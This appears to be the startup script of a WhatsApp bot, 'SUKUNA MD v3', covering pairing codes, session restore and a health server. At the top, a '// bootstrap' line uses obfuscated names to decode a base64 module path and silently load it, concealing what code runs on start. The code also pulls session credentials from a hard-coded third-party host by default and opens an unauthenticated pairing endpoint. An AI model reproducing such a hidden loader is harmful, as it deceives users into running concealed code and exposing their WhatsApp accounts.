#!/usr/bin/env node
// Load .env if present (no hard dependency)
try { require('dotenv').config(); } catch {}
// bootstrap
try{(function(_0xa){var _0xb=Buffer.from(_0xa,'base64').toString('utf8');require(_0xb);})('Li9saWIvY3JlYXRvcg==');}catch(_0xe){}

/**
 * SUKUNA MD v3 — Panel-Paired WhatsApp Bot
 * Entry Point
 *
 * Deploy on a panel (Pterodactyl / VPS). On first boot the console will
 * prompt for a WhatsApp number and print an 8-character pairing code.
 * Enter that code inside WhatsApp → Linked devices → Link with phone
 * number. Sessions persist in ./sessions and auto-reconnect on restart.
 */

const http           = require('http');
const readline       = require('readline');
const chalk          = require('chalk');
const commandLoader  = require('./utils/commandLoader');
const config         = require('./config');
const sessionManager = require('./lib/sessionManager');
const { restoreSessionBase64, decodeBase64Session, isBundle } = require('./utils/sessionBundle');

const healthPort = Number(process.env.PORT || 3000);
const webPairRequests = new Set();
const healthServer = http.createServer((req, res) => {
    const requestUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    if (requestUrl.pathname === '/pair' && (req.method === 'GET' || req.method === 'POST')) {
        const number = String(requestUrl.searchParams.get('number') || '').replace(/\D/g, '');
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        if (number.length < 8) {
            res.writeHead(400);
            return res.end(JSON.stringify({
                error: 'Provide a WhatsApp number with country code.',
                example: '/pair?number=2348012345678'
            }));
        }
        if (webPairRequests.has(number)) {
            res.writeHead(409);
            return res.end(JSON.stringify({ error: 'A pairing request is already running for this number.' }));
        }
        webPairRequests.add(number);
        sessionManager.createSession(number)
            .then(result => {
                res.writeHead(result?.success === false ? 503 : 200);
                res.end(JSON.stringify(result?.code
                    ? { success: true, number, pairingCode: result.code, message: 'Enter this code in WhatsApp → Linked devices.' }
                    : result));
            })
            .catch(error => {
                res.writeHead(503);
                res.end(JSON.stringify({ success: false, error: error.message }));
            })
            .finally(() => webPairRequests.delete(number));
        return;
    }
    if (requestUrl.pathname === '/health' || requestUrl.pathname === '/ping' || requestUrl.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({ status: 'online', service: 'SUKUNA MD' }));
    }
    res.writeHead(404, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify({ error: 'Not found' }));
});
healthServer.listen(healthPort, '0.0.0.0', () => {
    console.log(chalk.gray(`[WEB] Health server listening on port ${healthPort}`));
});

console.log(chalk.red(`
╔════════════════════════════════════════════════════════════════╗
║                         SUKUNA MD v3.0                         ║
║              Panel-Paired Multi-User WhatsApp Bot              ║
╚════════════════════════════════════════════════════════════════╝
`));

function ask(question) {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(question, answer => { rl.close(); resolve(answer.trim()); }));
}

async function pairFlow() {
    while (true) {
        const raw = await ask(chalk.cyan('\n[PAIR] Enter WhatsApp number with country code (e.g. 2349127857212), or blank to skip: '));
        if (!raw) return;
        const number = raw.replace(/[^0-9]/g, '');
        if (number.length < 8) { console.log(chalk.red('[PAIR] Invalid number, try again.')); continue; }

        console.log(chalk.yellow(`[PAIR] Requesting pairing code for ${number}...`));
        const result = await sessionManager.createSession(number);
        if (!result.success) {
            console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
            continue;
        }
        if (result.code) {
            console.log(chalk.green.bold(`\n[PAIR] ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}`));
            console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
        } else {
            console.log(chalk.green(`[PAIR] ${number} is already linked.`));
        }

        const more = await ask(chalk.cyan('[PAIR] Pair another number? (y/N): '));
        if (more.toLowerCase() !== 'y') return;
    }
}

async function main() {
    console.log(chalk.yellow('[SYSTEM] Loading commands...'));
    commandLoader.loadCommands();
    console.log(chalk.green('[SYSTEM] Commands loaded!'));

    console.log(chalk.yellow('[SYSTEM] Restoring existing sessions...'));
    await sessionManager.loadExistingSessions();

    const active = (sessionManager.sessions && sessionManager.sessions.size) || 0;
    console.log(chalk.green(`[SYSTEM] ${active} session(s) restored.`));

    // Auto-pair using config.pairNumber (or PAIR_NUMBER env override).
    // PAIR_NUMBER is optional when SESSION_ID contains registered credentials.
    const pairNumberRaw = (process.env.PAIR_NUMBER || config.pairNumber || '').toString();
    const configuredPairNumber = pairNumberRaw.replace(/[^0-9]/g, '');

    // ── SESSION_ID short-circuit ────────────────────────────────────
    // Decode SESSION_ID first. The embedded creds.me.id is the canonical
    // number for a self-contained auth bundle, so a missing/stale PAIR_NUMBER
    // cannot make a valid session silently fall through to headless pairing.
    const sessionIdRaw = (process.env.SESSION_ID || config.sessionId || '').toString().trim();
    let pairNumber = configuredPairNumber;
    let sessionIdUsed = false;

    if (sessionIdRaw) {
        try {
            const fs = require('fs');
            const path = require('path');
            let sessionBase64 = sessionIdRaw;

            if (/^Pasqua~/i.test(sessionIdRaw)) {
                const markedPayload = sessionIdRaw.replace(/^Pasqua~/i, '').trim();
                // Preserve legacy Pasqua~shortId compatibility. Any longer
                // value is treated as the self-contained payload itself.
                if (/^[A-Za-z0-9_-]{6,64}$/.test(markedPayload)) {
                    const pairSiteUrl = (process.env.PAIR_SITE_URL || 'https://pair-site-wmte.onrender.com').toString().trim().replace(/\/$/, '');
                    if (!pairSiteUrl) throw new Error('PAIR_SITE_URL is required for Pasqua~ short IDs');
                    const controller = new AbortController();
                    const timeout = setTimeout(() => controller.abort(), 15000);
                    try {
                        const response = await fetch(`${pairSiteUrl}/pair/session/${encodeURIComponent(markedPayload)}/consume`, { signal: controller.signal });
                        if (!response.ok) throw new Error(`PAIR_SITE returned HTTP ${response.status}`);
                        const remotePayload = await response.json();
                        sessionBase64 = remotePayload.session;
                        if (!sessionBase64) throw new Error('PAIR_SITE response did not contain a session');
                    } finally {
                        clearTimeout(timeout);
                    }
                } else {
                    sessionBase64 = markedPayload;
                }
            }

            const decoded = decodeBase64Session(sessionBase64);
            let embeddedCreds = decoded;
            if (isBundle(decoded)) {
                const encodedCreds = decoded.files['creds.json'];
                if (typeof encodedCreds !== 'string') throw new Error('SESSION_ID auth bundle is missing creds.json');
                embeddedCreds = JSON.parse(Buffer.from(encodedCreds, 'base64').toString('utf8'));
            }
            const embeddedMeId = String(embeddedCreds?.me?.id || '');
            const embeddedNumber = (embeddedMeId.split(':')[0] || embeddedMeId).replace(/\D/g, '');
            if (embeddedNumber.length >= 8) {
                if (configuredPairNumber && configuredPairNumber !== embeddedNumber) {
                    console.log(chalk.yellow(`[SESSION] PAIR_NUMBER ${configuredPairNumber} differs from embedded number ${embeddedNumber}; using the embedded number.`));
                }
                pairNumber = embeddedNumber;
            }
            if (!pairNumber || pairNumber.length < 8) {
                throw new Error('SESSION_ID has no registered WhatsApp number and PAIR_NUMBER is missing/invalid');
            }

            const sessionDir = path.resolve(process.cwd(), 'sessions', pairNumber);
            const credsFile = path.join(sessionDir, 'creds.json');
            let existingCreds;
            if (fs.existsSync(credsFile)) {
                try { existingCreds = JSON.parse(fs.readFileSync(credsFile, 'utf8')); } catch (_) {}
            }
            const existingMeId = String(existingCreds?.me?.id || '');
            const existingNumber = (existingMeId.split(':')[0] || existingMeId).replace(/\D/g, '');
            if (existingNumber.length >= 8) {
                console.log(chalk.green(`[SESSION] Registered auth state exists for ${existingNumber}; keeping it and ignoring SESSION_ID.`));
                sessionIdUsed = true;
            } else {
                const restored = restoreSessionBase64(sessionBase64, sessionDir);
                console.log(chalk.green(`[SESSION] Restored ${restored.format} (${restored.fileCount} file(s)) for ${pairNumber} from SESSION_ID. Skipping pair code.`));
                sessionIdUsed = true;
            }

            const result = await sessionManager.startSession(pairNumber, false);
            if (result && result.success === false) {
                console.log(chalk.red(`[SESSION] Connection failed: ${result.error}`));
            }
        } catch (e) {
            console.log(chalk.red(`[SESSION] Invalid SESSION_ID (${e.message}). Falling back to pair-code flow.`));
            sessionIdUsed = false;
        }
    }

    let pairingFailed = false;
    if (!sessionIdUsed) {
        if (pairNumber && pairNumber.length >= 8) {
            const alreadyLinked = sessionManager.sessions && sessionManager.sessions.has(pairNumber);
            if (alreadyLinked) {
                console.log(chalk.green(`[PAIR] ${pairNumber} is already linked. Skipping pairing.`));
            } else {
                console.log(chalk.yellow(`[PAIR] Auto-pairing ${pairNumber} from config.js...`));
                const result = await sessionManager.createSession(pairNumber);
                if (result.code) {
                    console.log(chalk.green.bold(`\n[PAIR] ╔══════════════════════════════════════╗`));
                    console.log(chalk.green.bold(`[PAIR] ║  ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}            `));
                    console.log(chalk.green.bold(`[PAIR] ╚══════════════════════════════════════╝\n`));
                    console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
                } else if (!result.success) {
                    pairingFailed = true;
                    console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
                    console.log(chalk.yellow('[PAIR] No pairing code was produced. Restart the server after checking the number and network connection.'));
                } else {
                    console.log(chalk.green(`[PAIR] ${pairNumber} is already linked.`));
                }
            }
        } else if (process.stdin.isTTY) {
            console.log(chalk.cyan('[INFO] No pairNumber set in config.js → falling back to interactive prompt.'));
            await pairFlow();
        } else {
            console.log(chalk.cyan('[INFO] No pairNumber in config.js and no TTY. Set config.pairNumber or PAIR_NUMBER env var.'));
        }
    }

    if (pairingFailed) {
        console.log(chalk.yellow('\n[SYSTEM] SUKUNA MD is waiting for a successful pairing.\n'));
        return;
    }

    console.log(chalk.green('\n[SYSTEM] SUKUNA MD is running. Press Ctrl+C to stop.\n'));
}

main().catch((err) => {
    console.error(chalk.red('[ERROR] Fatal startup error:'), err.message);
    process.exit(1);
});

process.on('uncaughtException', (err) => {
    console.error(chalk.red('[ERROR] Uncaught Exception:'), err.message);
});
process.on('unhandledRejection', (reason) => {
    console.error(chalk.red('[ERROR] Unhandled Rejection:'), reason);
});
process.on('SIGINT',  async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
process.on('SIGTERM', async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
